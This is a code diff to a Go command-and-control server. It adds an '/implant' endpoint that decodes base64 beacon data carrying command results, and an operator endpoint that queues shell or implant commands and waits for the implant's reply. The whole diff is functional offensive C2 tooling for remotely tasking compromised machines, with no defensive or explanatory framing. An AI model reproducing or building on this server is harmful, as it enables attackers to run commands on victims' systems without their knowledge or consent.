@@ -4,13 +4,24 @@ import (
 	"log"
 	"net/http"
 	"net"
+    "encoding/base64"
+    "strings"
 )
 
 var err error
 var serverIP string
 var ip string
-
+var cmdGroup string 
+var cmdString string
 var commandQueue [][]string 
+
+type Command struct {
+    Group    string
+    Command  string
+    Response string
+}
+
+var responseChan = make(chan Command)
 
 func main() {
     // Get the server's IP address
@@ -22,7 +33,7 @@ func main() {
 }
 
 func startServer() {
-    http.HandleFunc("/test", sendCMD)
+    http.HandleFunc("/implant", handleImplant)
     http.HandleFunc("/operator", handleOperator)
     serverIP, err := getServerIP()
     if err != nil {
@@ -62,31 +73,68 @@ func getServerIP() (string, error) {
     return "", fmt.Errorf("unable to determine server IP address")
 }
 
-func sendCMD(w http.ResponseWriter, r *http.Request) {
-    for {
-        if len(commandQueue) > 0 {
-            // Get the first command pair from the queue
-            cmdPair := commandQueue[0]
-            cmdGroup := cmdPair[0]
-            cmdString := cmdPair[1]
-            // Define the response body as a string
-            responseBody := "cmdGroup:" + cmdGroup + "\n" +
-            "cmdString:" + cmdString
+func handleImplant(w http.ResponseWriter, r *http.Request) {
+    // Parse the URL query parameters
+    queryParams := r.URL.Query()
 
-            // Set Content-Type header
-            w.Header().Set("Content-Type:", "text/plain")
-
-            // Set Content-Length header
-            w.Header().Set("Content-Length:", fmt.Sprint(len(responseBody)))
-
-            // Write the status code
-            w.WriteHeader(http.StatusOK)
-
-            // Write the response body
-            fmt.Fprintf(w, responseBody)
+    // Retrieve the value of 'aa' parameter
+    aaParam := queryParams.Get("aa")
+    // Check if 'aa' parameter is present
+    if aaParam != "" {
+        // Decode the base64-encoded value
+        decodedBytes, err := base64.StdEncoding.DecodeString(aaParam)
+        if err != nil {
+            http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
+            return
         }
-            // Remove the processed command pair from the queue
-            commandQueue = commandQueue[1:]
+
+        // Convert the decoded bytes to string
+        decodedString := string(decodedBytes)
+        fmt.Println(decodedString)
+        // Split the decoded string by &)
+        params := strings.Split(decodedString, "&")
+        paramMap := make(map[string]string)
+
+        for _, param := range params {
+            keyValue := strings.Split(param, "=")
+            if len(keyValue) == 2 {
+                key := keyValue[0]
+                value := keyValue[1]
+                paramMap[key] = value
+            }
+        }
+
+        responseChan <- Command{
+            Group:    paramMap["cmdValue"],
+            Command:  paramMap["cmdString"],
+            Response: paramMap["cmdResponse"],
+        }
+
+
+
+    } else {
+        http.Error(w, "No parameter found in the request", http.StatusBadRequest)
+    }
+
+    if len(commandQueue) != 0 {
+        cmdPair := commandQueue[0]
+        cmdGroup = cmdPair[0]
+        cmdString = cmdPair[1]
+
+        // Define the response body as a string
+        responseBody := "cmdGroup:" + cmdGroup + "\n" +
+        "cmdString:" + cmdString
+
+        // Set Content-Type header
+        w.Header().Set("Content-Type:", "text/plain")
+
+        // Set Content-Length header
+        w.Header().Set("Content-Length:", fmt.Sprint(len(responseBody)))
+
+        // Write the response body
+        fmt.Fprintf(w, responseBody)
+        // Remove the processed command pair from the queue
+        commandQueue = commandQueue[1:]
     }
 }
 
@@ -112,22 +160,11 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
     // Store the command in the global commands array
     commandQueue = append(commandQueue, []string{cmdGroup, cmdString})
 
-    // Handle the command based on cmdGroup
-    switch cmdGroup {
-    case "shell":
-        // Handle shell commands
-        fmt.Printf("Executing shell command: %s\n", cmdString)
-        // Execute shell command here
-    case "implant":
-        // Handle implant commands
-        fmt.Printf("Executing implant command: %s\n", cmdString)
-        // Execute implant command here
-    default:
-        http.Error(w, "Invalid cmdGroup", http.StatusBadRequest)
-        return
-    }
+    // Wait for the response from the implant
+    response := <-responseChan
 
-    // Send response
+    responseJSON := fmt.Sprintf(`{"cmdGroup": "%s", "cmdString": "%s", "cmdResponse": "%s"}`, response.Group, response.Command, response.Response)
+    w.Header().Set("Content-Type", "application/json")
     w.WriteHeader(http.StatusOK)
-    fmt.Fprintf(w, "Command received: %s %s", cmdGroup, cmdString)
+    _, _ = w.Write([]byte(responseJSON))
 }
